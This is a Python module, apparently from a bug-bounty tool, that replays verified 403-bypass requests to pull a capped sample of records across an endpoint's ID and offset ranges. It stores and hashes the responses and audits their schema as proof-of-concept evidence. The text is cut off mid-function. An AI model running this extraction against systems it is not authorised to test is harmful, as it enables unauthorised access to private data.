"""
Extraction engine for Arbiter-403.

After Section H determines the *Projected Reach*, this module sets up
the data-structures needed to **prove** the bypass allows actual data
access, not merely a status-code anomaly.

Public API
----------
``initialize_extraction_job(endpoint_id)``
    Reads reach_summary / traversal mechanic from the DB and returns
    a structured extraction-job descriptor.

``build_extraction_queue(endpoint_id)``
    Selects 5–10 **representative** object IDs as PoC evidence and
    persists them into ``extraction_queue``.  This is the *logic gate*
    that prevents the tool from extracting the entire dataset.

``generate_extraction_payload(endpoint_id, object_id)``
    Using the minimal bypass combination found in Section E,
    generates a fully-formed request spec for a specific record.

``traverse_dataset_segments(endpoint_id)``
    Ensures at least one record is extracted from **each** distinct
    segment identified in Section H (ID clusters, page ranges),
    proving the bypass is not restricted to a single part of the DB.

``audit_extraction_completeness(endpoint_id)``
    Completeness Auditor — verifies every extracted record has
    populated fields (not null/placeholder), compares the key schema
    of record #1 vs record #10, and marks the extraction as
    **Logically Complete** when the schemas match.

``format_poc_evidence(endpoint_id)``
    Packages the first 3 successful extractions into a triager-ready
    JSON file with redacted content and pre-built curl commands.
    Saved as ``poc_evidence_<endpoint_id>.json``.

``store_extraction_result(...)``
    Persist one extracted object with a SHA-256 verification hash.

All results are persisted to the ``extraction_results`` table.
"""

from __future__ import annotations

import hashlib
import json
import logging
import math
import os
import re
from datetime import datetime, timezone
from pathlib import Path

from typing import Any

from bypasser.db import get_connection  # type: ignore
from bypasser.probing import (  # type: ignore
    _execute_request,
    _resolve_header_name,
    _apply_protocol,
    _substitute_object_id,
    _HEADER_CATEGORIES,
)
from bypasser.baseline import USER_AGENT  # type: ignore

logger = logging.getLogger(__name__)

# ── PoC Logic Gate ──────────────────────────────────────────────────
_POC_MIN_RECORDS = 5
_POC_MAX_RECORDS = 10


# ═══════════════════════════════════════════════════════════════════════
#  Public API
# ═══════════════════════════════════════════════════════════════════════

def initialize_extraction_job(endpoint_id: int) -> dict:
    """
    Prepare an extraction job for *endpoint_id*.

    The returned dict contains everything a downstream extraction
    loop needs: the target URL, every verified bypass combo_key,
    the reach estimate, and the traversal mechanic that will be
    used to iterate over objects.

    Parameters
    ----------
    endpoint_id : int
        Primary key in ``endpoints``.

    Returns
    -------
    dict
        ::

            {
                "endpoint_id":     int,
                "url":             str,
                "combos":          [           # one per verified combo_key
                    {
                        "combo_key":          str,
                        "reach_summary":      dict,
                        "traversal_mechanic": str,
                        "id_type":            str,
                        "predictability":     str,
                        "boundary_radius":    int | None,
                        "sequential_ids":     list[int],
                        "pagination": {
                            "hard_cap":            int | None,
                            "max_offset_reached":  int | None,
                        },
                    },
                    ...
                ],
                "table_ready":     bool,      # True once table exists
                "created_at":      str,       # ISO-8601 timestamp
            }

    Raises
    ------
    ValueError
        If *endpoint_id* does not exist.
    """
    conn = get_connection()
    try:
        # ── 1.  Endpoint lookup ───────────────────────────────────
        ep_row = conn.execute(
            "SELECT id, url FROM endpoints WHERE id = ?",
            (endpoint_id,),
        ).fetchone()
        if ep_row is None:
            raise ValueError(
                f"endpoint_id {endpoint_id} not found in endpoints."
            )

        url: str = ep_row["url"]

        # ── 2.  Verified combos + reach_summary ──────────────────
        ca_rows = conn.execute(
            """
            SELECT combo_key, reach_summary
              FROM candidate_access
             WHERE endpoint_id = ?
               AND is_verified  = 1
             ORDER BY combo_key
            """,
            (endpoint_id,),
        ).fetchall()

        if not ca_rows:
            logger.info(
                "[EXTRACT] endpoint %d: no verified combos — "
                "nothing to extract.",
                endpoint_id,
            )
            return {
                "endpoint_id": endpoint_id,
                "url":         url,
                "combos":      [],
                "table_ready": True,
                "created_at":  _now_iso(),
            }

        # ── 3.  Identifier analysis ──────────────────────────────
        id_rows = conn.execute(
            """
            SELECT combo_key, id_value, id_type,
                   is_sequential, predictability
              FROM identifier_analysis
             WHERE endpoint_id = ?
             ORDER BY combo_key, id
            """,
            (endpoint_id,),
        ).fetchall()

        # ── 4.  Boundary probes ──────────────────────────────────
        reach_rows = conn.execute(
            """
            SELECT combo_key, probed_id, offset, bypass_held
              FROM dataset_reach
             WHERE endpoint_id = ?
             ORDER BY combo_key, offset
            """,
            (endpoint_id,),
        ).fetchall()

        # ── 5.  Pagination probes ────────────────────────────────
        pag_rows = conn.execute(
            """
            SELECT combo_key, hard_cap,
                   probe_type, probed_value, bypass_held
              FROM pagination_reach
             WHERE endpoint_id = ?
             ORDER BY combo_key, id
            """,
            (endpoint_id,),
        ).fetchall()

        # ── 6.  Ensure extraction_results table exists ───────────
        _ensure_extraction_table(conn)

    finally:
        conn.close()

    # ── 7.  Assemble per-combo job descriptors ───────────────────
    combos: list[dict] = []

    for ca in ca_rows:
        combo_key = ca["combo_key"]

        # Parse reach_summary JSON.
        raw_rs = ca["reach_summary"]
        try:
            reach_summary = (
                json.loads(raw_rs) if isinstance(raw_rs, str) else {}
            )
        except (json.JSONDecodeError, TypeError):
            reach_summary = {}

        # Determine the traversal mechanic from identifier analysis.
        combo_ids     = [r for r in id_rows if r["combo_key"] == combo_key]
        id_type       = "Unknown"
        predictability = "Unknown"
        sequential_ids: list[int] = []

        for idr in combo_ids:
            id_type = idr["id_type"]
            predictability = idr["predictability"]
            if idr["is_sequential"]:
                try:
                    sequential_ids.append(int(idr["id_value"]))
                except ValueError:
                    pass

        # Determine traversal mechanic label.
        if predictability == "Highly Enumerable":
            traversal_mechanic = "sequential_id_enumeration"
        elif predictability == "Partially Predictable":
            traversal_mechanic = "partial_id_prediction"
        elif id_type == "UUID":
            traversal_mechanic = "uuid_harvest"
        else:
            traversal_mechanic = "pagination_crawl"

        # Extend sequential IDs with boundary probes that succeeded.
        combo_reach = [
            r for r in reach_rows if r["combo_key"] == combo_key
        ]
        for rr in combo_reach:
            if rr["bypass_held"]:
                try:
                    sequential_ids.append(int(rr["probed_id"]))
                except ValueError:
                    pass

        # Boundary radius (largest successful absolute offset).
        boundary_radius: int | None = None
        held_offsets = [
            abs(rr["offset"]) for rr in combo_reach if rr["bypass_held"]
        ]
        if held_offsets:
            boundary_radius = max(held_offsets)

        # Pagination metadata.
        combo_pag = [
            r for r in pag_rows if r["combo_key"] == combo_key
        ]

        hard_cap: int | None = None
        max_offset_reached: int | None = None

        for pr in combo_pag:
            if pr["hard_cap"] is not None:
                cap = int(pr["hard_cap"])
                if hard_cap is None:
                    hard_cap = cap
                elif cap < hard_cap:  # type: ignore
                    hard_cap = cap

            if (
                pr["probe_type"] == "offset_jump"
                and pr["bypass_held"]
            ):
                try:
                    val = int(pr["probed_value"])
                except ValueError:
                    continue
                if max_offset_reached is None:
                    max_offset_reached = val
                elif val > max_offset_reached:  # type: ignore
                    max_offset_reached = val

        combos.append({
            "combo_key":          combo_key,
            "reach_summary":      reach_summary,
            "traversal_mechanic": traversal_mechanic,
            "id_type":            id_type,
            "predictability":     predictability,
            "boundary_radius":    boundary_radius,
            "sequential_ids":     sorted(set(sequential_ids)),
            "pagination": {
                "hard_cap":           hard_cap,
                "max_offset_reached": max_offset_reached,
            },
        })

    job = {
        "endpoint_id": endpoint_id,
        "url":         url,
        "combos":      combos,
        "table_ready": True,
        "created_at":  _now_iso(),
    }

    logger.info(
        "[EXTRACT] endpoint %d: extraction job initialised — "
        "%d combo(s), mechanics: %s",
        endpoint_id,
        len(combos),
        ", ".join(c["traversal_mechanic"] for c in combos),
    )

    return job


# ═══════════════════════════════════════════════════════════════════════
#  Extraction queue  — PoC Logic Gate (5–10 records)
# ═══════════════════════════════════════════════════════════════════════

def build_extraction_queue(endpoint_id: int) -> list[dict]:
    """
    Select **5–10 representative records** for PoC extraction.

    This is the *logic gate* — the tool deliberately limits itself to
    a handful of samples to serve as evidence in the bug report, not
    a full dump.

    Selection strategy
    ------------------
    For each verified combo_key on the endpoint:

    1. Gather all known sequential IDs from the extraction job
       (identifier analysis + boundary probes).
    2. If sequential IDs are available:
       a. Always take the **min** and **max** (boundary proof).
       b. Take the **median** (centre-mass proof).
       c. Fill the remainder with evenly spaced samples.
    3. If no sequential IDs exist, generate 5–10 offset-based
       placeholder targets (``offset:0``, ``offset:100``, …).
    4. Cap each combo at ``_POC_MAX_RECORDS``.

    Queue entries are persisted to ``extraction_queue`` and returned.

    Parameters
    ----------
    endpoint_id : int

    Returns
    -------
    list[dict]
        One dict per queued record::

            {
                "endpoint_id": int,
                "combo_key":   str,
                "object_id":   str,
                "position":    int,
                "status":      "pending",
            }
    """
    job = initialize_extraction_job(endpoint_id)

    if not job["combos"]:
        logger.info(
            "[EXTRACT-Q] endpoint %d: no combos — queue is empty.",
            endpoint_id,
        )
        return []

    conn = get_connection()
    try:
        _ensure_queue_table(conn)
    finally:
        conn.close()

    all_queued: list[dict] = []

    for combo in job["combos"]:
        combo_key = combo["combo_key"]
        seq_ids   = combo["sequential_ids"]  # already sorted

        selected: list[str] = []

        if seq_ids and len(seq_ids) >= 2:
            # ── Sequential ID selection ──────────────────────────
            id_min = seq_ids[0]
            id_max = seq_ids[-1]
            id_mid = seq_ids[len(seq_ids) // 2]

            # Start with boundary + centre.
            anchors = [id_min, id_mid, id_max]
            seen = set(anchors)
            selected = [str(a) for a in anchors]

            # Fill remaining slots with evenly spaced samples.
            remaining = _POC_MAX_RECORDS - len(selected)
            if remaining > 0 and len(seq_ids) > 3:
                step = max(1, len(seq_ids) // (remaining + 1))
                for i in range(step, len(seq_ids), step):
                    if seq_ids[i] not in seen:
                        selected.append(str(seq_ids[i]))
                        seen.add(seq_ids[i])
                    if len(selected) >= _POC_MAX_RECORDS:
                        break

            # If we still have fewer than _POC_MIN, pad from seq_ids.
            for sid in seq_ids:
                if len(selected) >= _POC_MIN_RECORDS:
                    break
                if sid not in seen:
                    selected.append(str(sid))
                    seen.add(sid)

        elif seq_ids and len(seq_ids) == 1:
            # Single known ID — use it plus neighbours.
            base = seq_ids[0]
            selected = [str(base)]
            for delta in [1, -1, 2, -2, 5, -5, 10, -10, 50]:
                candidate = base + delta
                if candidate > 0:
                    selected.append(str(candidate))
                if len(selected) >= _POC_MAX_RECORDS:
                    break

        else:
            # ── No sequential IDs: pagination / offset targets ───
            offsets = [0, 10, 50, 100, 500, 1000, 2000, 5000]
            hard_cap = combo["pagination"].get("hard_cap")
            if hard_cap and isinstance(hard_cap, int):
                offsets = [o for o in offsets if o < hard_cap * 10]
            selected = [f"offset:{o}" for o in offsets[:_POC_MAX_RECORDS]]  # type: ignore

        # Enforce the cap.
        selected = selected[:_POC_MAX_RECORDS]  # type: ignore

        # Persist to extraction_queue.
        conn = get_connection()
        try:
            for pos, obj_id in enumerate(selected):
                conn.execute(
                    """
                    INSERT INTO extraction_queue
                        (endpoint_id, combo_key, object_id,
                         position, status)
                    VALUES (?, ?, ?, ?, 'pending')
                    ON CONFLICT(endpoint_id, combo_key, object_id)
                    DO UPDATE SET position = excluded.position
                    """,
                    (endpoint_id, combo_key, obj_id, pos),
                )
                all_queued.append({
                    "endpoint_id": endpoint_id,
                    "combo_key":   combo_key,
                    "object_id":   obj_id,
                    "position":    pos,
                    "status":      "pending",
                })
            conn.commit()
        finally:
            conn.close()

        logger.info(
            "[EXTRACT-Q] endpoint %d  combo %-30s  "
            "%d record(s) queued (IDs: %s)",
            endpoint_id,
            combo_key,
            len(selected),
            ", ".join(selected[:5])
            + ("…" if len(selected) > 5 else ""),
        )

    logger.info(
        "[EXTRACT-Q] endpoint %d: total %d record(s) in queue "
        "across %d combo(s).",
        endpoint_id,
        len(all_queued),
        len(job["combos"]),
    )

    return all_queued


# ═══════════════════════════════════════════════════════════════════════
#  Payload generator — reconstruct the Section E bypass request
# ═══════════════════════════════════════════════════════════════════════

def generate_extraction_payload(
    endpoint_id: int,
    object_id: str,
) -> dict:
    """
    Build a bypass request targeting a **specific** object.

    Uses the *minimal* verified bypass combination from Section E
    (stored in ``candidate_access.combination_id``) to reconstruct
    the mutated request spec — headers, URL rewriting, method
    overrides, etc. — then substitute *object_id* into the URL.

    Parameters
    ----------
    endpoint_id : int
        Primary key in ``endpoints``.
    object_id : str
        The target record identifier (e.g. ``"42"`` or ``"offset:100"``).

    Returns
    -------
    dict
        ::

            {
                "endpoint_id":  int,
                "object_id":    str,
                "combo_key":    str,
                "url":          str,
                "method":       str,
                "headers":      dict[str, str],
                "primer_methods": list[str] | None,
                "ready":        bool,
            }

    Raises
    ------
    ValueError
        If *endpoint_id* has no verified bypass or does not exist.
    """
    conn = get_connection()
    try:
        # ── 1.  Endpoint data ────────────────────────────────────
        ep = conn.execute(
            "SELECT id, url, method FROM endpoints WHERE id = ?",
            (endpoint_id,),
        ).fetchone()
        if ep is None:
            raise ValueError(
                f"endpoint_id {endpoint_id} not found."
            )

        url: str    = ep["url"]
        method: str = ep["method"]

        # ── 2.  Best verified bypass combo ───────────────────────
        #    Pick the combo with the highest impact_score; ties
        #    broken by smallest combo_depth (fewer mutations = more
        #    reliable).
        ca_row = conn.execute(
            """
            SELECT ca.combo_key, ca.combination_id
              FROM candidate_access ca
             WHERE ca.endpoint_id = ?
               AND ca.is_verified  = 1
             ORDER BY ca.impact_score DESC,
                      json_extract(ca.combination_id, '$.depth') ASC
             LIMIT 1
            """,
            (endpoint_id,),
        ).fetchone()

        if ca_row is None:
            raise ValueError(
                f"No verified bypass found for endpoint_id "
                f"{endpoint_id}."
            )

        combo_key: str = ca_row["combo_key"]
        combination_raw = ca_row["combination_id"]

        # ── 3.  Resolve variable details ─────────────────────────
        try:
            combo_desc = (
                json.loads(combination_raw)
                if isinstance(combination_raw, str)
                else {}
            )
        except (json.JSONDecodeError, TypeError):
            combo_desc = {}

        variable_ids = combo_desc.get("variable_ids", [])

        if not variable_ids:
            logger.warning(
                "[EXTRACT-P] endpoint %d: combo %s has no "
                "variable_ids — cannot build payload.",
                endpoint_id, combo_key,
            )
            return _empty_payload(endpoint_id, object_id, combo_key)

        # Fetch the actual variable definitions.
        placeholders = ",".join("?" for _ in variable_ids)
        var_rows = conn.execute(
            f"""
            SELECT id, name, category, test_value
              FROM policy_variables
             WHERE id IN ({placeholders})
             ORDER BY id
            """,
            variable_ids,
        ).fetchall()

    finally:
        conn.close()

    variables: list[dict] = [
        {
            "id":         r["id"],
            "name":       r["name"],
            "category":   r["category"],
            "test_value": r["test_value"],
        }
        for r in var_rows
    ]

    # ── 4.  Build the mutated request ────────────────────────────
    req = _build_extraction_request(url, method, variables, object_id)

    payload = {
        "endpoint_id":    endpoint_id,
        "object_id":      object_id,
        "combo_key":      combo_key,
        "url":            req["url"],
        "method":         req["method"],
        "headers":        req["headers"],
        "primer_methods": req["primer_methods"],
        "ready":          True,
    }

    logger.info(
        "[EXTRACT-P] endpoint %d  object %s  → %s %s",
        endpoint_id,
        object_id,
        req["method"],
        req["url"],
    )

    return payload


# ═══════════════════════════════════════════════════════════════════════
#  Segment traversal — cross-segment extraction proof
# ═══════════════════════════════════════════════════════════════════════

# Segment gap threshold: two IDs must be more than this far apart to
# be considered members of different segments.
_SEGMENT_GAP_THRESHOLD = 100


def traverse_dataset_segments(endpoint_id: int) -> list[dict]:
    """
    Ensure at least one record is extracted from **every** distinct
    segment discovered during Section H probing.

    A “segment” is a contiguous cluster of IDs or a distinct
    pagination offset range where the bypass was confirmed.  If
    Section H probed IDs 1–50, 5 001“5 050, and 10 001“10 050, those
    are three distinct segments.  This function selects one
    representative from each cluster, fires the bypass request, and
    logs the result — proving the flaw is **systemic**, not a
    localised fluke.

    Algorithm
    ---------
    1. Query ``dataset_reach`` for all boundary-probe IDs where
       ``bypass_held = 1`` for the endpoint.
    2. Query ``pagination_reach`` for all offset-jump probes where
       ``bypass_held = 1``.
    3. **Cluster** the IDs: sort them and split into segments whenever
       the gap between consecutive IDs exceeds
       ``_SEGMENT_GAP_THRESHOLD``.
    4. For pagination-only endpoints, treat each successful offset as
       a separate segment.
    5. Pick a **median** representative from each segment.
    6. Generate the extraction payload and execute the request.
    7. On success (HTTP 200 or same status as the original bypass),
       store the result in ``extraction_results``.

    Parameters
    ----------
    endpoint_id : int

    Returns
    -------
    list[dict]
        One dict per segment attempted::

            {
                "segment_index":  int,
                "segment_label":  str,
                "representative_id": str,
                "combo_key":      str,
                "http_status":    int | None,
                "body_length":    int,
                "extracted":      bool,
                "verification_hash": str,
            }
    """
    job = initialize_extraction_job(endpoint_id)

    if not job["combos"]:
        logger.info(
            "[SEGMENT] endpoint %d: no combos — nothing to traverse.",
            endpoint_id,
        )
        return []

    # ── Gather held probes from Section H ─────────────────────────
    conn = get_connection()
    try:
        # Boundary probes (dataset_reach)
        boundary_rows = conn.execute(
            """
            SELECT combo_key, probed_id, offset
              FROM dataset_reach
             WHERE endpoint_id = ?
               AND bypass_held = 1
             ORDER BY combo_key, probed_id
            """,
            (endpoint_id,),
        ).fetchall()

        # Pagination offset probes (pagination_reach)
        pag_rows = conn.execute(
            """
            SELECT combo_key, probed_value, probe_type
              FROM pagination_reach
             WHERE endpoint_id  = ?
               AND bypass_held  = 1
               AND probe_type   = 'offset_jump'
             ORDER BY combo_key, CAST(probed_value AS INTEGER)
            """,
            (endpoint_id,),
        ).fetchall()

        # Get the original bypass status to match against.
        ca_row = conn.execute(
            """
            SELECT new_status
              FROM candidate_access
             WHERE endpoint_id = ?
               AND is_verified  = 1
             LIMIT 1
            """,
            (endpoint_id,),
        ).fetchone()
        bypass_status: int = ca_row["new_status"] if ca_row else 200

    finally:
        conn.close()

    results: list[dict] = []

    for combo in job["combos"]:
        combo_key = combo["combo_key"]
        mechanic  = combo["traversal_mechanic"]

        # ── 1. Collect all held IDs for this combo ──────────────
        held_ids: list[int] = []

        # From boundary probes
        for br in boundary_rows:
            if br["combo_key"] == combo_key:
                try:
                    held_ids.append(int(br["probed_id"]))
                except (ValueError, TypeError):
                    pass

        # Also include the sequential_ids from identifier analysis
        held_ids.extend(combo.get("sequential_ids", []))

        # ── 2. Collect pagination offsets ─────────────────────
        pag_offsets: list[int] = []
        for pr in pag_rows:
            if pr["combo_key"] == combo_key:
                try:
                    pag_offsets.append(int(pr["probed_value"]))
                except (ValueError, TypeError):
                    pass

        # ── 3. Cluster into segments ─────────────────────────
        id_segments = _cluster_ids(sorted(set(held_ids)))
        offset_segments = _cluster_ids(
            sorted(set(pag_offsets)),
            gap=500,  # offsets are typically spaced wider
        )

        # Merge: ID segments + offset segments (as separate entries)
        all_segments: list[dict] = []

        for idx, cluster in enumerate(id_segments):
            mid = cluster[len(cluster) // 2]
            all_segments.append({
                "label": f"id_cluster_{idx}"
                         f"[{cluster[0]}–{cluster[-1]}]",
                "representative": str(mid),
                "kind": "id",
            })

        for idx, cluster in enumerate(offset_segments):
            mid = cluster[len(cluster) // 2]
            all_segments.append({
                "label": f"offset_range_{idx}"
                         f"[{cluster[0]}–{cluster[-1]}]",
                "representative": f"offset:{mid}",
                "kind": "offset",
            })

        if not all_segments:
            logger.info(
                "[SEGMENT] endpoint %d  combo %-30s  "
                "no segments found.",
                endpoint_id, combo_key,
            )
            continue

        logger.info(
            "[SEGMENT] endpoint %d  combo %-30s  "
            "%d segment(s) identified.",
            endpoint_id, combo_key, len(all_segments),
        )

        # ── 4. Extract one record per segment ─────────────────
        for seg_idx, seg in enumerate(all_segments):
            rep_id = seg["representative"]

            try:
                payload = generate_extraction_payload(
                    endpoint_id, rep_id,
                )
            except ValueError as exc:
                logger.warning(
                    "[SEGMENT]   seg %d (%s) — payload error: %s",
                    seg_idx, seg["label"], exc,
                )
                results.append({
                    "segment_index":     seg_idx,
                    "segment_label":     seg["label"],
                    "representative_id": rep_id,
                    "combo_key":         combo_key,
                    "http_status":       None,
                    "body_length":       0,
                    "extracted":         False,
                    "verification_hash": "",
                })
                continue

            if not payload.get("ready"):
                results.append({
                    "segment_index":     seg_idx,
                    "segment_label":     seg["label"],
                    "representative_id": rep_id,
                    "combo_key":         combo_key,
                    "http_status":       None,
                    "body_length":       0,
                    "extracted":         False,
                    "verification_hash": "",
                })
                continue

            # Fire the request.
            resp = _execute_request(
                payload["method"],
                payload["url"],
                payload["headers"],
                payload.get("primer_methods"),
            )

            extracted = False
            v_hash   = ""

            if resp["error"] is None and resp["status"] == bypass_status:
                # Successful extraction.
                body = resp.get("body", "")
                if len(body) > 50:  # non-trivial content
                    stored = store_extraction_result(
                        endpoint_id=endpoint_id,
                        combo_key=combo_key,
                        object_id=rep_id,
                        content=body,
                        traversal_mechanic=mechanic,
                    )
                    v_hash = stored["verification_hash"]
                    extracted = True

            status_tag = (
                "✓ extracted" if extracted
                else f"✗ HTTP {resp['status']}" if resp["error"] is None
                else f"✗ error"
            )
            logger.info(
                "[SEGMENT]   seg %d  %-35s  rep=%s  %s",
                seg_idx, seg["label"], rep_id, status_tag,
            )

            results.append({
                "segment_index":     seg_idx,
                "segment_label":     seg["label"],
                "representative_id": rep_id,
                "combo_key":         combo_key,
                "http_status":       resp.get("status"),
                "body_length":       resp.get("length", 0),
                "extracted":         extracted,
                "verification_hash": v_hash,
            })

    # ── Summary ────────────────────────────────────────────
    extracted_count = sum(1 for r in results if r["extracted"])
    total_segs      = len(results)
    logger.info(
        "[SEGMENT] endpoint %d: %d/%d segment(s) successfully "
        "extracted — cross-segment bypass %s.",
        endpoint_id,
        extracted_count,
        total_segs,
        "CONFIRMED" if extracted_count == total_segs and total_segs > 1
        else "partial" if extracted_count > 0
        else "FAILED",
    )

    return results


def _cluster_ids(
    sorted_ids: list[int],
    gap: int = _SEGMENT_GAP_THRESHOLD,
) -> list[list[int]]:
    """
    Split a sorted list of IDs into contiguous clusters.

    A new cluster starts whenever the distance between consecutive
    IDs exceeds *gap*.
    """
    if not sorted_ids:
        return []

    clusters: list[list[int]] = [[sorted_ids[0]]]

    for i in range(1, len(sorted_ids)):
        if sorted_ids[i] - sorted_ids[i - 1] > gap:
            clusters.append([sorted_ids[i]])
        else:
            clusters[-1].append(sorted_ids[i])

    return clusters


# ═══════════════════════════════════════════════════════════════════════
#  Persistence helpers
# ═══════════════════════════════════════════════════════════════════════

def store_extraction_result(
    endpoint_id: int,
    combo_key: str,
    object_id: str,
    content: dict | list | str,
    traversal_mechanic: str = "",
) -> dict:
    """
    Persist one extracted object into ``extraction_results``.

    The *content* is serialised to JSON and a SHA-256
    ``verification_hash`` is computed over the canonical JSON bytes
    so the evidence can be independently verified later.

    Returns the stored row as a dict.
    """
    content_json = json.dumps(content, sort_keys=True, default=str)
    verification_hash = hashlib.sha256(content_json.encode()).hexdigest()
    ts = _now_iso()

    conn = get_connection()
    try:
        conn.execute(
            """
            INSERT INTO extraction_results
                (endpoint_id, combo_key, object_id,
                 content_json, extraction_timestamp,
                 verification_hash, traversal_mechanic)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(endpoint_id, combo_key, object_id)
            DO UPDATE SET
                content_json         = excluded.content_json,
                extraction_timestamp = excluded.extraction_timestamp,
                verification_hash    = excluded.verification_hash,
                traversal_mechanic   = excluded.traversal_mechanic
            """,
            (
                endpoint_id,
                combo_key,
                object_id,
                content_json,
                ts,
                verification_hash,
                traversal_mechanic,
            ),
        )
        conn.commit()
    finally:
        conn.close()

    result = {
        "endpoint_id":          endpoint_id,
        "combo_key":            combo_key,
        "object_id":            object_id,
        "content_json":         content_json,
        "extraction_timestamp": ts,
        "verification_hash":    verification_hash,
        "traversal_mechanic":   traversal_mechanic,
    }

    logger.debug(
        "[EXTRACT]   stored object %s (hash: %s…)",
        object_id,
        verification_hash[:12],  # type: ignore
    )

    return result


# ═══════════════════════════════════════════════════════════════════════
#  Completeness Auditor — schema consistency verification
# ═══════════════════════════════════════════════════════════════════════

# Values treated as "empty / placeholder" when auditing field quality.
_PLACEHOLDER_VALUES = frozenset({
    "null", "none", "n/a", "na", "undefined", "placeholder",
    "test", "todo", "tbd", "unknown", "example", "sample",
    "foo", "bar", "baz", "lorem", "ipsum", "xxx", "yyy",
    "default", "dummy", "temp", "tmp",
})


def audit_extraction_completeness(endpoint_id: int) -> dict:
    """
    Completeness Auditor for extracted records.

    Performs two levels of verification:

    **Per-record audit** — for every extracted record, checks that
    each JSON field contains a real, populated value (not ``null``,
    empty string, or a known placeholder token like ``"test"`` /
    ``"n/a"`` / ``"placeholder"``).

    **Cross-record schema comparison** — compares the top-level key
    set of the *first* extracted record against the *tenth* (or the
    last record if fewer than ten exist).  If the key sets are
    identical, the extraction is marked **Logically Complete**,
    confirming the attacker has full read access to the entire
    object schema rather than a partial or truncated view.

    Parameters
    ----------
    endpoint_id : int

    Returns
    -------
    dict
        ::

            {
                "endpoint_id":       int,
                "total_records":     int,
                "records_audited":   int,
                "per_record": [
                    {
                        "object_id":       str,
                        "combo_key":       str,
                        "total_fields":    int,
                        "populated":       int,
                        "empty_or_null":   int,
                        "placeholder":     int,
                        "field_issues":    list[str],
                        "quality_pct":     float,
                    },
                    ...
                ],
                "schema_comparison": {
                    "record_a_id":      str,
                    "record_b_id":      str,
                    "keys_a":           list[str],
                    "keys_b":           list[str],
                    "keys_only_in_a":   list[str],
                    "keys_only_in_b":   list[str],
                    "keys_in_common":   list[str],
                    "schema_match":     bool,
                },
                "logically_complete": bool,
                "verdict":            str,
            }
    """
    conn = get_connection()
    try:
        rows = conn.execute(
            """
            SELECT object_id, combo_key, content_json
              FROM extraction_results
             WHERE endpoint_id = ?
             ORDER BY id ASC
            """,
            (endpoint_id,),
        ).fetchall()
    finally:
        conn.close()

    total_records = len(rows)

    if total_records == 0:
        logger.info(
            "[AUDIT] endpoint %d: no extracted records to audit.",
            endpoint_id,
        )
        return {
            "endpoint_id":       endpoint_id,
            "total_records":     0,
            "records_audited":   0,
            "per_record":        [],
            "schema_comparison": {},
            "logically_complete": False,
            "verdict":           "No extracted records available.",
        }

    # ── Per-record audit ─────────────────────────────────────────
    per_record_results: list[dict] = []
    parsed_records: list[tuple[str, str, dict]] = []  # (obj_id, combo, data)

    for row in rows:
        obj_id    = row["object_id"]
        combo_key = row["combo_key"]
        raw       = row["content_json"]

        # Attempt to parse the stored JSON.
        try:
            data = json.loads(raw) if isinstance(raw, str) else raw
        except (json.JSONDecodeError, TypeError):
            data = raw

        # If data is a dict, audit its fields.
        if isinstance(data, dict):
            audit = _audit_dict_fields(data)
            parsed_records.append((obj_id, combo_key, data))
        elif isinstance(data, list) and data and isinstance(data[0], dict):
            # Array of objects — audit the first element as representative.
            audit = _audit_dict_fields(data[0])
            parsed_records.append((obj_id, combo_key, data[0]))
        else:
            # Scalar or non-dict — limited audit.
            is_populated = bool(data) and str(data).strip() != ""
            audit = {
                "total_fields":  1,
                "populated":     1 if is_populated else 0,
                "empty_or_null": 0 if is_populated else 1,
                "placeholder":   0,
                "field_issues":  [] if is_populated
                                 else ["body: empty or null"],
                "quality_pct":   100.0 if is_populated else 0.0,
            }
            parsed_records.append(
                (obj_id, combo_key, {"_raw": data})
            )

        per_record_results.append({
            "object_id":     obj_id,
            "combo_key":     combo_key,
            "total_fields":  audit["total_fields"],
            "populated":     audit["populated"],
            "empty_or_null": audit["empty_or_null"],
            "placeholder":   audit["placeholder"],
            "field_issues":  audit["field_issues"],
            "quality_pct":   audit["quality_pct"],
        })

    # ── Cross-record schema comparison ───────────────────────────
    #    Compare record #1 vs record #10 (or last record).
    rec_a_idx = 0
    rec_b_idx = min(9, len(parsed_records) - 1)  # #10 or last

    id_a, _, data_a = parsed_records[rec_a_idx]
    id_b, _, data_b = parsed_records[rec_b_idx]

    keys_a = sorted(data_a.keys()) if isinstance(data_a, dict) else []
    keys_b = sorted(data_b.keys()) if isinstance(data_b, dict) else []

    set_a = set(keys_a)
    set_b = set(keys_b)

    keys_only_a = sorted(set_a - set_b)
    keys_only_b = sorted(set_b - set_a)
    keys_common = sorted(set_a & set_b)
    schema_match = (set_a == set_b) and len(set_a) > 0

    schema_comparison = {
        "record_a_id":    id_a,
        "record_b_id":    id_b,
        "keys_a":         keys_a,
        "keys_b":         keys_b,
        "keys_only_in_a": keys_only_a,
        "keys_only_in_b": keys_only_b,
        "keys_in_common": keys_common,
        "schema_match":   schema_match,
    }

    # ── Overall verdict ──────────────────────────────────────────
    #    "Logically Complete" requires:
    #    1. Schema keys match between first and last compared record.
    #    2. Average field quality >= 70%.
    avg_quality = (
        sum(r["quality_pct"] for r in per_record_results)
        / len(per_record_results)
        if per_record_results else 0.0
    )

    logically_complete = schema_match and avg_quality >= 70.0

    if logically_complete:
        verdict = (
            f"Logically Complete — {len(keys_common)} fields "
            f"consistent across record #{rec_a_idx + 1} and "
            f"#{rec_b_idx + 1}, avg quality {avg_quality:.0f}%. "
            f"Full read access to object schema confirmed."
        )
    elif schema_match:
        verdict = (
            f"Schema consistent but field quality low "
            f"({avg_quality:.0f}%). Some fields contain "
            f"null or placeholder values."
        )
    else:
        diff_desc = []
        if keys_only_a:
            diff_desc.append(
                f"{len(keys_only_a)} key(s) only in record "  # type: ignore
                f"#{rec_a_idx + 1}"
            )
        if keys_only_b:
            diff_desc.append(
                f"{len(keys_only_b)} key(s) only in record "  # type: ignore
                f"#{rec_b_idx + 1}"
            )
        verdict = (
            f"Schema mismatch — {'; '.join(diff_desc)}. "
            f"Extraction may be partial or schema varies "
            f"by record."
        )

    logger.info(
        "[AUDIT] endpoint %d: %d record(s) audited. "
        "Schema match: %s. Avg quality: %.0f%%. "
        "Verdict: %s",
        endpoint_id,
        total_records,
        "YES" if schema_match else "NO",
        avg_quality,
        "LOGICALLY COMPLETE" if logically_complete else "INCOMPLETE",
    )

    return {
        "endpoint_id":        endpoint_id,
        "total_records":      total_records,
        "records_audited":    len(per_record_results),
        "per_record":         per_record_results,
        "schema_comparison":  schema_comparison,
        "logically_complete": logically_complete,
        "verdict":            verdict,
    }


def _audit_dict_fields(data: dict) -> dict:
    """
    Audit a single dict's fields for population quality.

    Returns counts of populated / empty / placeholder fields, a list
    of issue descriptions, and a quality percentage.
    """
    total      = len(data)
